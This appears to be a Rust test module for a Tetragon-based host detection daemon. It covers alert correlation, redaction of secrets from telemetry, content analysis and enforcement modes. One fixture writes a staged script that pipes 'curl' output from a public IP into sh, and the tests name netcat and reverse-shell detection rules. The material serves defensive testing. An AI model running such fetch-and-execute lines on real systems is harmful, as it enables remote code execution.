        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 3, "all three are recorded");
        assert_eq!(recs[0]["body"], "#!/bin/sh\necho hi\n", "the script's body");
        assert!(
            recs[1].get("body").is_none(),
            "a private key's body must never be captured: {}",
            recs[1]
        );
        assert!(recs[2].get("body").is_none(), "over the cap");

        // …and a staged artefact's body is refused even though its path looks
        // like an ordinary script. moat-ship blanks the PATH wherever it
        // appears, but it cannot recognise a body, so the refusal is here.
        std::fs::create_dir_all(&d.cfg.analysis.bundle_dir).unwrap();
        let staged = d.cfg.analysis.bundle_dir.join("actor.setup.sh.suspect");
        std::fs::write(&staged, b"#!/bin/sh\nexfil\n").unwrap();
        d.handle_line(&hook(&staged));
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 4);
        assert!(
            recs[3].get("body").is_none(),
            "staged evidence body reached telemetry: {}",
            recs[3]
        );
        assert!(!std::fs::read_to_string(d.cfg.paths.telemetry())
            .unwrap()
            .contains("exfil"));
        // The key is still described — withheld is not hidden.
        assert!(recs[1]["sha256"].is_string());
        let all = std::fs::read_to_string(d.cfg.paths.telemetry()).unwrap();
        assert!(!all.contains("BEGIN OPENSSH PRIVATE KEY"), "key material reached the file");
    }

    #[test]
    fn the_process_class_records_exec_and_exit_without_the_parent_block() {
        let dir = tempfile::tempdir().unwrap();
        let mut d = telemetry_daemon(dir.path(), |t| t.process = true);
        d.handle_line(
            r#"{"process_exec":{"process":{"exec_id":"p1","pid":41233,"uid":1000,
                 "binary":"/usr/bin/node","arguments":"setup.mjs","cwd":"/home/dan/p",
                 "start_time":"2026-09-04T10:00:00.000000000Z","parent_exec_id":"p0"},
                 "parent":{"exec_id":"p0","pid":41230,"binary":"/usr/bin/sh","arguments":"-c x"}},
                 "time":"2026-09-04T10:00:00.100000000Z"}"#,
        );
        d.handle_line(
            r#"{"process_exit":{"process":{"exec_id":"p1","pid":41233,"binary":"/usr/bin/node"},
                 "status":0},"time":"2026-09-04T10:00:01.000000000Z"}"#,
        );
        d.flush_telemetry();
        let recs = telemetry_lines(&d);
        assert_eq!(recs.len(), 2);
        assert_eq!(recs[0]["kind"], "exec");
        assert_eq!(recs[0]["parent_exec_id"], "p0");
        assert!(recs[0].get("parent").is_none(), "the join halves the bytes");
        assert_eq!(recs[1]["kind"], "exit");
        assert_eq!(recs[1]["exec_id"], "p1");
        assert_eq!(d.telemetry_written, 2);
    }

    /// Design 2b/3a end to end, through the real event path.
    ///
    /// The shipped sample log is one `npm install` whose postinstall script
    /// reads an SSH key and a cloud credential, opens a reverse shell, talks to
    /// a host outside the registry allowlist, and ends up in ptrace and setuid.
    /// Before this stage those were eight separate alerts a person had to
    /// assemble in their head. They are one story under one process.
    #[test]
    fn the_sample_installs_alerts_correlate_into_one_chain() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let text = std::fs::read_to_string(&d.cfg.paths.tetragon_log).unwrap();
        for line in text.lines() {
            d.handle_line(line);
        }
        let alerts = d.store.load();
        let chained: Vec<&Alert> = alerts.iter().filter(|a| a.chain.is_some()).collect();
        assert!(chained.len() >= 4, "expected one chain across the install, got {}", chained.len());

        // Every member carries the same chain, so a reader that opened any one
        // of them can draw the whole story without a second lookup.
        let c = chained[0].chain.clone().unwrap();
        for a in &chained {
            assert_eq!(a.chain.as_ref().unwrap().id, c.id, "{} is in a different chain", a.id);
        }

        // The subject is the install, not whichever process happened to trip
        // the last rule.
        assert_eq!(c.ancestor.exe, "/usr/bin/npm");
        assert!(c.families.contains(&"cred".to_string()));
        assert!(c.families.contains(&"net".to_string()));

        // Higher than any member is the whole point, and it is written down.
        assert_eq!(c.severity, "critical");
        assert!(
            c.severity_reason.contains("credential") || c.severity_reason.starts_with("stays"),
            "escalation must justify itself: {}",
            c.severity_reason
        );
        assert!(c.summary.contains("under npm"), "{}", c.summary);

        // Steps are in time order, and each one names an alert that exists.
        let ids: std::collections::HashSet<&str> = alerts.iter().map(|a| a.id.as_str()).collect();
        let mut prev = String::new();
        for s in &c.steps {
            assert!(ids.contains(s.alert.as_str()), "step names a missing alert {}", s.alert);
            assert!(s.alert > prev, "steps out of order at {}", s.alert);
            prev = s.alert.clone();
        }

        // A member's own severity is never rewritten by the chain: it is still
        // the right answer about the single event it describes.
        let low = alerts.iter().find(|a| a.rule == "moat-pkg-subtree-interpreter-spawn").unwrap();
        assert_eq!(low.severity, "low", "the chain must not rewrite member severities");
        assert_eq!(low.chain.as_ref().unwrap().severity, "critical");

        // And the daemon reports it.
        let st = d.status();
        assert_eq!(st["chains_formed"], 1);
        assert_eq!(st["chains_open"], 1);
    }

    /// Regression for the 2026-09-04 20:41 miss, driven through `emit` because
    /// the fault was in `note_chain`'s mapping and not in the correlator: a
    /// `chain.rs` unit test passed throughout.
    ///
    /// A simulated npm C2 package rewrote `.git/config` (persist, high,
    /// first_seen) and read a project token (cred, medium, rare) from one pid
    /// one second apart. Nothing correlated. `note_chain` was passing
    /// `silenced: alert.surface != "alerts"`, and `scoring::surface_for` routes
    /// on severity alone — so every medium and low was quietly a context step
    /// and the documented "at least one member at medium or worse" had become
    /// "at least two members at high or worse".
    #[test]
    fn a_medium_alert_is_a_chain_trigger_not_context() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // One `node` under a bash whose own parent the daemon never saw: the
        // one-element ancestry of the real records.
        // Neither path may exist: a `high` alert takes an incident snapshot,
        // which opens and hashes both the exe and the file it names. See
        // `no_test_fixture_names_a_path_that_exists_on_this_machine`.
        let lab = "/tmp/moat-chain-regression-no-such-lab";
        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: lab.into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        };
        let node = proc("e-node", 1_876_167, "/home/dan/.no-such-mise/node/26.5.0/bin/node");
        let bash = proc("e-bash", 581_833, "/usr/bin/bash");

        let finding = |rule: &str, family: &str, severity: &str, path: String| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), node.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("write".into());
            f.ancestry = vec![bash.clone()];
            f.file = Some(crate::alert::FileRef { path, sha256: None });
            f
        };

        let a = d
            .emit(finding(
                "moat-persist-git-config-write",
                "persist",
                "high",
                format!("{}/.git/config", lab),
            ))
            .expect("the persist write must raise an alert");
        let b = d
            .emit(finding(
                "moat-cred-project-token-read",
                "cred",
                "medium",
                format!("{}/.env", lab),
            ))
            .expect("the token read must raise an alert");

        let alerts = d.store.load();
        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
        let (pa, ca) = (by_id(&a), by_id(&b));

        // The shape the live daemon actually recorded, so this test fails if
        // the routing that caused the bug ever changes meaning.
        assert_eq!(pa.severity, "high");
        assert_eq!(pa.surface, "alerts");
        assert_eq!(ca.severity, "medium");
        // `surface_for` routed this medium to the timeline, and then the chain
        // reached `high` and restamped its trigger members. That is the whole
        // point: a correlated sequence has to be able to reach the badge even
        // when each half is unremarkable on its own.
        assert_eq!(ca.surface, "alerts", "a high chain raises its trigger members");
        assert!(ca.suppressed_by.is_none(), "nobody allowlisted this");

        // Both alerts carry the sequence, and both count as triggers.
        let chain = pa.chain.clone().expect("the two alerts must correlate");
        assert_eq!(ca.chain.as_ref().map(|c| c.id.as_str()), Some(chain.id.as_str()));
        assert_eq!(chain.steps.len(), 2);
        assert!(
            chain.steps.iter().all(|s| s.is_trigger()),
            "a timeline alert is weak, not allowed: {:?}",
            chain.steps.iter().map(|s| s.role.clone()).collect::<Vec<_>>()
        );
        assert_eq!(chain.families, vec!["persist", "cred"]);
        assert_eq!(chain.ancestor.pid, 1_876_167);
        assert_eq!(d.status()["chains_formed"], 1);

        // The member's own SEVERITY is untouched: the chain is the escalation,
        // and `medium` is still the right answer about one read. What the chain
        // does change is where the member is shown -- a sequence worth
        // interrupting for cannot be one nobody is shown.
        assert_eq!(by_id(&b).severity, "medium");
        assert_eq!(by_id(&b).surface, "alerts");
        assert!(by_id(&b).suppressed_by.is_none());
    }

    /// A high chain reads the files it implicated, and the findings land where
    /// they help — without moving a single severity.
    ///
    /// The trigger is deliberately narrow: this is the ONLY path in the daemon
    /// that opens a file to look at its contents. If a future change makes
    /// something scan on write, on exec or on a timer, that is an anti-virus,
    /// and it was explicitly rejected for this product.
    #[test]
    fn a_high_chain_reads_what_it_implicated_and_changes_no_severity() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let lab = dir.path().join("lab");
        std::fs::create_dir_all(lab.join(".config/autostart")).unwrap();

        // The dropper: a real ELF, so the parser is exercised on something a
        // linker produced rather than on a fixture.
        let dropper = lab.join(".fontconfig-helper");
        std::fs::copy("/bin/sh", &dropper).unwrap();
        // The persistence artefact: a script carrying the vocabulary.
        let unit = lab.join(".config/autostart/update.desktop");
        std::fs::write(
            &unit,
            b"#!/bin/sh\n# updater\ncurl -sL http://45.9.148.99/stage2 | sh\neval(atob('cm0='))\n",
        )
        .unwrap();
        // The credential the same tree read. It must never be opened.
        let secret = lab.join(".env");
        std::fs::write(&secret, b"AWS_SECRET_ACCESS_KEY=hunter2\n").unwrap();

        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: lab.display().to_string(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        };
        let actor = proc("e-drop", 4242, &dropper.display().to_string());
        let parent = proc("e-bash", 4241, "/usr/bin/bash");
        let finding = |rule: &str, family: &str, severity: &str, path: String| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.hook_detail = Some("write".into());
            f.ancestry = vec![parent.clone()];
            f.file = Some(crate::alert::FileRef { path, sha256: None });
            f
        };

        let persist = d
            .emit(finding(
                "moat-persist-autostart-write",
                "persist",
                "high",
                unit.display().to_string(),
            ))
            .unwrap();
        let cred = d
            .emit(finding(
                "moat-cred-project-token-read",
                "cred",
                "medium",
                secret.display().to_string(),
            ))
            .unwrap();

        let alerts = d.store.load();
        let by_id = |id: &str| alerts.iter().find(|x| x.id == id).unwrap().clone();
        let pa = by_id(&persist);
        assert!(pa.chain.is_some(), "the two alerts must correlate first");

        // --- the actor: a real ELF, read the way ldd and nm read it.
        let elf = pa
            .content
            .iter()
            .find(|c| c.role == "actor")
            .expect("the binary that acted was analysed");
        assert_eq!(elf.kind, "elf", "type comes from magic bytes");
        assert_eq!(elf.sha256.len(), 64);
        let e = elf.elf.as_ref().expect("ELF details");
        assert_eq!(e.linkage, "dynamic");
        assert!(e.needed.iter().any(|n| n.starts_with("libc.so")), "{:?}", e.needed);
        assert!(e.sections.iter().any(|s| s.name == ".text"));

        // --- the target: the vocabulary, the C2 address, and its range.
        let script = pa
            .content
            .iter()
            .find(|c| c.role == "target")
            .expect("the file it touched was analysed");
        assert_eq!(script.kind, "script");
        assert_eq!(script.script.as_ref().unwrap().interpreter, "/bin/sh");
        let names: Vec<&str> = script.markers.iter().map(|m| m.name.as_str()).collect();
        assert!(names.contains(&"exec:curl-pipe-shell"), "{:?}", names);
        assert!(
            script.hosts.iter().any(|h| h.value == "45.9.148.99" && h.scope == "public"),
            "{:?}",
            script.hosts
        );

        // --- the credential is named and never opened. `is_secret_path` is the
        // authority, and it holds on this path even though the rule that
        // matched it is in the family whose target IS the secret.
        let ca = by_id(&cred);
        let refused = ca
            .content
            .iter()
            .find(|c| c.role == "target")
            .expect("the credential is still listed");
        assert!(
            refused.skipped.as_deref().unwrap_or("").contains("credential"),
            "{:?}",
            refused.skipped
        );
        assert!(refused.sha256.is_empty(), "a refused file is not even hashed");
        assert!(refused.strings.is_empty());

        // --- findings are evidence. They are on the alert's evidence list, and
        // in the bundle, and they moved nothing.
        assert_eq!(pa.severity, "high", "content analysis must not move a severity");
        assert_eq!(ca.severity, "medium");
        assert_eq!(pa.severity_base, by_id(&persist).severity_base);
        assert!(
            pa.explain.evidence.iter().any(|l| l.contains("45.9.148.99 [public]")),
            "{:?}",
            pa.explain.evidence
        );
        let md = d.write_bundle(&persist).unwrap();
        let body = std::fs::read_to_string(&md).unwrap();
        assert!(body.contains("## What is inside those files"));
        assert!(body.contains("45.9.148.99"));

        // --- and the budget is spent, counted, and visible.
        assert!(d.status()["content"]["used"].as_u64().unwrap() >= 2);
    }

    /// What must be pushed back into the kernel after a restart.
    ///
    /// `tetra tp set-mode` changes a live policy and that change dies with the
    /// sensor. Restoring the armed set into memory only -- which is what the
    /// daemon did until 2026-09-04 -- meant that after any tetragon restart the
    /// rules reverted to `monitor` in the kernel while `status` and the panel
    /// still said ARMED. Believing a rule is enforcing when it is not is worse
    /// than knowing it is off.
    #[test]
    fn the_armed_set_is_pushed_back_into_the_kernel_after_a_restart() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        assert!(
            d.enforcement_to_apply().is_empty(),
            "a monitor daemon with nothing armed asks the kernel for nothing"
        );

        let rule = d.policies.names().first().cloned().expect("testdata policies");
        d.enforcing_rules.insert(rule.clone());
        assert_eq!(
            d.enforcement_to_apply(),
            vec![rule.clone()],
            "one armed rule is one policy to re-arm, not all of them"
        );

        // Daemon-wide enforce means every policy, not just the named ones.
        d.mode = "enforce".into();
        assert_eq!(d.enforcement_to_apply().len(), d.policies.names().len());
    }

    /// The kill decision must not act until it is asked to, and must not act
    /// twice on one chain.
    ///
    /// A design review on 2026-09-05 ran the first version of these rules
    /// against this machine's own records: they would have killed the user's
    /// build four times that day, thirteen processes at a time. `log` is the
    /// default because rules for an action with no undo have to be judged
    /// against real traffic before they are allowed to act.
    #[test]
    fn killing_is_off_until_asked_and_decided_once_per_chain() {
        assert_eq!(Config::default().contain.kill, "log", "never `kill` by default");
        assert!(
            !Config::default().contain.enabled,
            "and containment itself is off too"
        );

        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.kill = "off".into();

        // In `off` no chain is ever considered, so nothing is recorded about it.
        let c = crate::chain::Chain {
            v: 1,
            id: "01CHAIN".into(),
            ancestor: crate::alert::Ancestor { pid: 5000, exe: "/usr/bin/makepkg".into() },
            families: vec!["exec".into(), "net".into()],
            severity: "high".into(),
            severity_base: "high".into(),
            severity_reason: "r".into(),
            first_ts: util::now_rfc3339(),
            last_ts: util::now_rfc3339(),
            span_secs: 1,
            steps: vec![],
            steps_total: 0,
            truncated: false,
            members: Vec::new(),
            triggers_total: 0,
            summary: "s".into(),
        };
        d.maybe_kill_tree(&c, util::unix_secs());
        assert!(d.killed_chains.is_empty());

        // In `log` a chain with no usable targets is still not recorded, so a
        // later growth of the same chain can still be judged.
        d.cfg.contain.kill = "log".into();
        d.maybe_kill_tree(&c, util::unix_secs());
        assert!(d.killed_chains.is_empty(), "nothing to decide is not a decision");
    }

    /// Containment is the only thing moat does on its own judgement rather than
    /// on a rule the user armed, so it stays off until it is asked for --
    /// including when rules ARE armed and the daemon is enforcing.
    #[test]
    fn containment_never_happens_unless_it_was_turned_on() {
        assert!(
            !Config::default().contain.enabled,
            "the default must be off; a security default that surprises is a bug"
        );

        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.mode = "enforce".into();
        d.cfg.thresholds.dedupe_secs = 0;
        // A tetra that would fail loudly if it were ever run.
        d.cfg.paths.tetra = dir.path().join("no-such-tetra");
        let proc = |exec_id: &str, pid: u32, exe: &str| ProcInfo {
            exec_id: exec_id.into(),
            pid,
            uid: 1000,
            exe: exe.into(),
            args: String::new(),
            cwd: "/tmp/moat-contain-no-such-lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        };
        let actor = proc("e-imp", 7100, "/tmp/no-such-lab/implant");
        let root = proc("e-mk", 7000, "/usr/bin/no-such-makepkg");
        let mut mk = |rule: &str, family: &str, sev: &str, ip: Option<&str>| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), actor.clone());
            f.meta.family = family.into();
            f.meta.severity = sev.into();
            f.ancestry = vec![root.clone()];
            if let Some(ip) = ip {
                f.net = Some(crate::alert::NetRef {
                    dst_ip: ip.into(),
                    dst_port: 4873,
                    domain: None,
                });
            } else {
                f.hook = "file_post_open".into();
                f.file = Some(crate::alert::FileRef {
                    path: "/tmp/no-such-lab/dropped".into(),
                    sha256: None,
                });
            }
            d.emit(f)
        };
        mk("moat-persist-git-config-write", "persist", "high", None);
        mk("moat-x-pkg-egress", "net", "medium", Some("192.168.44.122"));

        assert!(
            d.contain.live().is_empty(),
            "a high chain must not contain anything while containment is off"
        );
    }

    /// Enforcement that refuses instead of killing.
    ///
    /// Every armed rule was `Sigkill` until 2026-09-04, because the network
    /// rules hung off the `tcp_connect` kprobe and that function cannot be
    /// error-injected -- so the only enforcement available was ending the
    /// process. On a developer's machine that is a bad trade: to stop one
    /// connection you take out a build, an editor or a shell, and lose the
    /// process tree you wanted to look at. `security_socket_connect` is a real
    /// LSM hook, so the connect can be refused with -EPERM instead.
    ///
    /// A refusal is recorded the moment it is seen. A kill is not -- it waits
    /// for process_exit to report SIGKILL -- because a kill that did not land
    /// must never be shown as one.
    #[test]
    fn a_refused_operation_is_recorded_without_waiting_for_a_death() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // Armed: a refusal is only a refusal where the kernel policy was
        // enforcing. This test used to pass in monitor mode, which is to say
        // it pinned the bug -- see the test below for the monitor half.
        d.enforcing_rules.insert("moat-net-tmpfs-binary-egress".into());
        d.handle_line(&exec_line("e-imp", 6100, "/tmp/dropped/implant", "", ""));
        let line = r#"{"process_kprobe":{"process":{"exec_id":"e-imp","pid":6100,"uid":1000,"binary":"/tmp/dropped/implant","cwd":"/tmp","start_time":"2026-09-04T23:00:00.000000000Z"},"function_name":"socket_connect","policy_name":"moat-net-tmpfs-binary-egress","action":"KPROBE_ACTION_OVERRIDE","args":[{"sock_arg":{"family":"AF_INET","daddr":"185.220.101.55","dport":443,"saddr":"192.168.1.20","sport":51234}}]},"time":"2026-09-04T23:00:00.100Z"}"#;
        d.handle_line(line);

        // Not `.pop()`: the same connect also feeds `moat-net-first-contact`,
        // which is the point of that rule.
        let alerts = d.store.load();
        let a = alerts
            .iter()
            .find(|x| x.rule == "moat-net-tmpfs-binary-egress")
            .expect("the refusal must be recorded");
        assert_eq!(
            a.action_taken, "blocked",
            "the kernel already refused it; nothing has to confirm that"
        );
        assert!(
            a.explain.evidence.iter().any(|e| e.contains("EPERM")),
            "the user is told the program is still running and saw the call fail: {:?}",
            a.explain.evidence
        );
    }

    /// The inverse of the test above, and the half that was missing: the same
    /// event under a monitor-mode policy is NOT a refusal. Tetragon reports the
    /// configured action either way; "blocked" beside "mode: monitor" was a
    /// record contradicting itself about whether a connection went out.
    #[test]
    fn a_configured_refusal_in_monitor_mode_is_not_recorded_as_one() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        assert_eq!(d.mode_for("moat-net-tmpfs-binary-egress"), "monitor", "precondition");
        d.handle_line(&exec_line("e-imp", 6100, "/tmp/dropped/implant", "", ""));
        let line = r#"{"process_kprobe":{"process":{"exec_id":"e-imp","pid":6100,"uid":1000,"binary":"/tmp/dropped/implant","cwd":"/tmp","start_time":"2026-09-04T23:00:00.000000000Z"},"function_name":"socket_connect","policy_name":"moat-net-tmpfs-binary-egress","action":"KPROBE_ACTION_OVERRIDE","args":[{"sock_arg":{"family":"AF_INET","daddr":"185.220.101.55","dport":443,"saddr":"192.168.1.20","sport":51234}}]},"time":"2026-09-04T23:00:00.100Z"}"#;
        d.handle_line(line);
        let alerts = d.store.load();
        let a = alerts
            .iter()
            .find(|x| x.rule == "moat-net-tmpfs-binary-egress")
            .expect("the event is still an alert");
        assert_eq!(a.mode, "monitor");
        assert_eq!(a.action_taken, "none", "nothing was refused in monitor mode");
        assert!(
            !a.explain.evidence.iter().any(|e| e.contains("EPERM")),
            "and the user is not told it was: {:?}",
            a.explain.evidence
        );
        assert!(a.explain.evidence.iter().any(|e| e.contains("monitor mode")));

        // Armed for that one rule, the same event is a refusal, and the
        // record says so consistently.
        d.enforcing_rules.insert("moat-net-tmpfs-binary-egress".into());
        d.cfg.thresholds.dedupe_secs = 0;
        d.handle_line(&line.replace("23:00:00.100Z", "23:00:05.100Z"));
        let b = d
            .store
            .load()
            .into_iter()
            .filter(|x| x.rule == "moat-net-tmpfs-binary-egress")
            .last()
            .unwrap();
        assert_eq!(b.mode, "enforce");
        assert_eq!(b.action_taken, "blocked");
    }

    /// One place stamps the mode an alert was raised under, and everything
    /// written about that alert agrees with it: the record, its evidence line,
    /// the incident snapshot's meta.json and the analysis bundle.
    #[test]
    fn everything_written_about_an_alert_agrees_on_its_mode() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        // Armed on its own: the daemon stays in monitor.
        d.enforcing_rules.insert("moat-net-first-contact".into());
        assert_eq!(d.mode, "monitor");

        // A userland-rule finding, built the way `RuleCtx::finding` builds one:
        // with the DAEMON's mode on it.
        let proc = ProcInfo {
            exec_id: "e-cli".into(),
            pid: 7300,
            uid: 1000,
            exe: "/tmp/no-such-lab/cli".into(),
            args: String::new(),
            cwd: "/tmp/no-such-lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            sid: None,
            tty: None,
        };
        let mut f = Finding::new(
            "moat-net-first-contact",
            crate::policy::PolicyMeta::fallback("moat-net-first-contact"),
            proc,
        );
        f.meta.severity = "high".into();
        f.hook = "userland".into();
        f.mode = d.mode.clone();
        f.net = Some(crate::alert::NetRef {
            dst_ip: "203.0.113.9".into(),
            dst_port: 443,
            domain: None,
        });
        let id = d.emit(f).expect("recorded");
        let a = d.store.find(&id).unwrap();
        assert_eq!(a.mode, "enforce", "the record carries the mode that governed the rule");
        assert_eq!(a.mode, d.mode_for(&a.rule));

        let bundle = d.write_bundle(&id).expect("bundle");
        let body = std::fs::read_to_string(&bundle).unwrap();
        assert!(
            body.contains("| mode | enforce |"),
            "the bundle's table is about the alert, so its mode row is the alert's: {}",
            body.lines().find(|l| l.starts_with("| mode")).unwrap_or("")
        );
    }

    /// Under a daemon-wide enforce every armable rule kills, and the Rules tab
    /// must say so: `armed` is what the kernel does for the rule, not whether
    /// the rule happens to be on the per-rule list.
    #[test]
    fn every_armable_rule_reads_armed_under_a_daemon_wide_enforce() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        assert!(d.enforceable().iter().all(|r| r["armed"] == false), "monitor: nothing armed");
        d.mode = "enforce".into();
        assert!(d.enforcing_rules.is_empty(), "a global switch lists no rule");
        let rows = d.enforceable();
        assert!(!rows.is_empty());
        for r in &rows {
            let rule = r["rule"].as_str().unwrap();
            assert_eq!(r["armed"], true, "{} kills under mode enforce", rule);
            assert_eq!(r["armed"] == true, d.mode_for(rule) == "enforce");
        }
        // The two userland rules that end a process are armable rules like any
        // other. Listing kernel policies only was why the per-rule switch could
        // not reach the only two rules that act on their own (CONTRACT §6.5).
        let names: Vec<&str> = rows.iter().filter_map(|r| r["rule"].as_str()).collect();
        for id in ["moat-pkg-subtree-netcat-exec", "moat-shell-stdio-socket"] {
            assert!(names.contains(&id), "{} must be armable: {:?}", id, names);
            let row = rows.iter().find(|r| r["rule"] == id).unwrap();
            assert_eq!(row["enforce"], "kill");
            assert_eq!(row["by"], "moatd", "it kills in the daemon, not in the kernel");
        }
    }

    /// One userland rule armed, the daemon still in monitor, nothing pushed
    /// into the kernel — and the arming survives a restart.
    ///
    /// `moat-pkg-subtree-netcat-exec` and `moat-shell-stdio-socket` are the two
    /// rules that kill from userland, and until 2026-09-05 they were the two
    /// the per-rule switch refused: `enforceable()` listed policies only,
    /// `set mode --rule` rejected the name, and `maybe_enforce` read the
    /// daemon-wide `mode` instead of `mode_for`. So arming either of them meant
    /// arming every rule on the machine, which is exactly the all-or-nothing
    /// per-rule enforcement exists to avoid.
    #[test]
    fn one_userland_rule_can_be_armed_while_the_daemon_stays_in_monitor() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, cfg) = dev_daemon(dir.path());
        let rule = "moat-shell-stdio-socket";
        d.enforcing_rules.insert(rule.to_string());

        assert_eq!(d.mode, "monitor", "the daemon as a whole is not enforcing");
        assert_eq!(d.mode_for(rule), "enforce", "but this one rule is");
        assert_eq!(d.mode_for("moat-pkg-subtree-netcat-exec"), "monitor", "and only this one");
        // The rule itself reads the same switch the daemon does.
        let ctx = d.ctx(util::unix_secs());
        assert!(ctx.enforcing(rule));
        assert!(!ctx.enforcing("moat-pkg-subtree-netcat-exec"));
        // Nothing is pushed into the kernel for it: there is no policy to set a
        // mode on, and `tetra tp set-mode` on an unknown name would fail and be
        // reported as enforcement that did not take.
        assert!(
            !d.enforcement_to_apply().contains(&rule.to_string()),
            "a userland rule has no kernel mode to re-apply"
        );
        assert_eq!(
            d.enforceable()
                .iter()
                .find(|r| r["rule"] == rule)
                .map(|r| r["armed"].clone()),
            Some(Value::Bool(true))
        );

        // And it round-trips across a restart the way a kernel rule does.
        d.write_state();
        let restarted = Daemon::new(cfg.clone(), &dir.path().join("moat.toml")).unwrap();
        assert!(restarted.enforcing_rules.contains(rule));
        assert_eq!(restarted.mode, "monitor");
        assert_eq!(restarted.mode_for(rule), "enforce");
    }

    // ------------------------------------------------- arming and verifying

    /// A `tetra` that keeps its own idea of what the kernel holds.
    ///
    /// `<dir>/modes` is the kernel: `name=mode` per line. `tp set-mode` edits
    /// it and refuses a name that is not there, exactly as the real one did
    /// seven times on 2026-09-05 (`tracing policy {moat-…} does not exist`).
    /// `tracingpolicy list -o json` reports it in the v1.7.1 shape. `<dir>/fail`
    /// makes every `set-mode` fail, for the sensor that never comes good.
    /// `<dir>/calls` is the transcript.
    fn fake_tetra(dir: &Path, loaded: &[(String, &str)]) -> PathBuf {
        let bin = dir.join("tetra");
        std::fs::write(
            &bin,
            r#"#!/bin/bash
d="$(dirname "$0")"
echo "$*" >> "$d/calls"
sub="$2"
case "$sub" in
  list)
    [ -f "$d/modes" ] || exit 1
    printf '{"policies":['
    first=1
    while IFS='=' read -r n m; do
      [ -z "$n" ] && continue
      [ $first -eq 1 ] || printf ','
      first=0
      printf '{"id":"1","name":"%s","state":"TP_STATE_ENABLED","mode":"TP_MODE_%s"}' \
        "$n" "$(echo "$m" | tr 'a-z' 'A-Z')"
    done < "$d/modes"
    printf ']}\n'
    ;;
  set-mode)
    n="$3"; m="$4"
    if [ -f "$d/fail" ] || ! grep -q "^$n=" "$d/modes" 2>/dev/null; then
      echo "tracing policy {$n} does not exist" >&2
      exit 1
    fi
    sed -i "s|^$n=.*|$n=$m|" "$d/modes"
    ;;
  *) exit 1 ;;
esac
"#,
        )
        .unwrap();
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&bin, std::fs::Permissions::from_mode(0o755)).unwrap();
        let body: String = loaded.iter().map(|(n, m)| format!("{}={}\n", n, m)).collect();
        std::fs::write(dir.join("modes"), body).unwrap();
        bin
    }

    fn tetra_calls(dir: &Path) -> Vec<String> {
        std::fs::read_to_string(dir.join("calls"))
            .unwrap_or_default()
            .lines()
            .map(str::to_string)
            .collect()
    }

    /// Pretend Tetragon has pinned `n` policies under its bpffs directory.
    fn pin(bpf: &Path, n: usize) {
        let _ = std::fs::remove_dir_all(bpf);
        std::fs::create_dir_all(bpf).unwrap();
        for i in 0..n {
            std::fs::create_dir_all(bpf.join(format!("moat-fake-{}", i))).unwrap();
        }
    }

    /// Arm every kernel policy and point the daemon at a fake sensor.
    fn armed_daemon(dir: &Path) -> (Daemon, Vec<String>) {
        let (mut d, _) = dev_daemon(dir);
        let names = d.policies.names();
        let loaded: Vec<(String, &str)> =
            names.iter().map(|n| (n.clone(), "monitor")).collect();
        d.cfg.paths.tetra = fake_tetra(dir, &loaded);
        d.cfg.paths.tetragon_bpf_dir = dir.join("bpf");
        d.cfg.thresholds.dedupe_secs = 0;
        for n in &names {
            d.enforcing_rules.insert(n.clone());
        }
        (d, names)
    }

    /// The 2026-09-05 outage, as a test.
    ///
    /// moatd re-armed 2 s after start while tetragon was 16 s from having
    /// loaded the last of 44 policies, so every `set-mode` failed against a
    /// name the kernel did not have yet — and nothing retried. The fix is that
    /// arming does not happen at all until the sensor says it is loaded.
    #[test]
    fn readiness_waits_for_the_pin_count_and_arms_once_it_is_reached() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, names) = armed_daemon(dir.path());
        let bpf = d.cfg.paths.tetragon_bpf_dir.clone();
        assert_eq!(names.len(), 5, "the fixture set");

        // The sensor has started but loaded nothing yet.
        pin(&bpf, 0);
        d.begin_arming(1_000);
        assert!(matches!(d.arming, Arming::Waiting { .. }), "arming is pending");
        d.arm_tick(1_000);
        assert!(
            !tetra_calls(dir.path()).iter().any(|c| c.contains("set-mode")),
            "nothing may be armed while the sensor is still loading: {:?}",
            tetra_calls(dir.path())
        );
        assert!(matches!(d.arming, Arming::Waiting { .. }), "still waiting");

